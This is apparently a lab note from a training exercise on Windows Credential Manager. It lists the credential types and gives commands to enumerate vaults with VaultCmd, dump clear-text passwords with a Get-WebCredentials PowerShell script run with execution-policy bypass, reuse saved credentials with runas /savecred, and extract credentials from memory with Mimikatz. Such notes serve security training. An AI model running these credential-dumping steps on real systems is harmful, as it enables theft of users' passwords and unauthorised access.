# Windows Credential Manager

Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, 
and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four 
credential categories:

* Web credentials contain authentication details stored in Internet browsers or other applications.
* Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
* Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
* Certificate-based credentials: Authenticated details based on certifications.

Note that authentication details are stored on the user's folder and are not shared among Windows user accounts. 
And, they are cached in memory.

Listing the Available Credentials from the Credentials Manager:

    C:\Users\Administrator>VaultCmd /list

To check for any stored credentials in the Web Credentials vault:

    C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"

To list more information about the stored credentials:

    C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"

## Credential Dumping

The VaultCmd is not able to show the password. Use `Get-WebCredentials.ps1`:

```text
C:\Users\Administrator>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red E4syPassw0rd {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
```

## RunAs

    C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe

## Mimikatz

To dump clear-text passwords stored in the Credential Manager from memory:

```text
C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
```

